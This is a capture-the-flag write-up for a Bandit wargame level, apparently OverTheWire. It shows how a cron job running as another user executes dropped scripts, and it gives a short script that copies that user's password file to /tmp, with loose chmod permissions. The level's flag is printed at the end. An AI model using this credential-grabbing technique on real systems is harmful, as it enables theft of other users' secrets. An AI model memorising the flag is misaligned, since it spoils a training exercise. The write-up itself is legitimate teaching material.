# Bandit 23

## Problem Information 
  > A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
  
  > NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
  
  > NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
  
## Solution
  > The cron job appears to execute all scripts found in /var/spool/$myname and remove them. The job is executed as bandit24, so the restriction in the script about it having to read from the bandit24 directory solves itself. Now, it's just a matter of making a password grabber to see what goodies lie in the forbidden lands of `/etc/bandit_pass`! A few things to note before just trying to `echo` the password to the terminal. The output is being routed to `/dev/null` so you will need to output instead to your own file in the `tmp/` directory. Next, make sure to change file permsissions so that the cron job will actually execute the script and again so that the output file can have the password written to it. Without that, you'll just be admiring your terminal ricing job for an hour before being booted off.
  
  Terminal flow of when first looking at the cron job and the script it runs.
  
    `cat /etc/cron.d/cronjob_bandit24 
    @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null` 
    
  `cat /usr/bin/cronjob_bandit24.sh 
    #!/bin/bash

    myname=$(whoami)

    cd /var/spool/$myname
    echo "Executing and deleting all scripts in /var/spool/$myname:"
      for i in * .*;
        do
          if [ "$i" != "." -a "$i" != ".." ];
            then
              echo "Handling $i"
              owner="$(stat --format "%U" ./$i)"
              if [ "${owner}" = "bandit23" ]; then
                timeout -s 9 60 ./$i
              fi
          rm -f ./$i
          fi
done`


Script for grabbing the password

`#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/cscripts/output.txt` 

Change permissions of your output file and script or you will be staring at a screen for quite a awhile.
`chmod 777 passwd_bandit24.sh` Make executable by the cron job.
`chmod 666 output.txt` Allow to be written to in order to receive the password
  
### Flag
`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
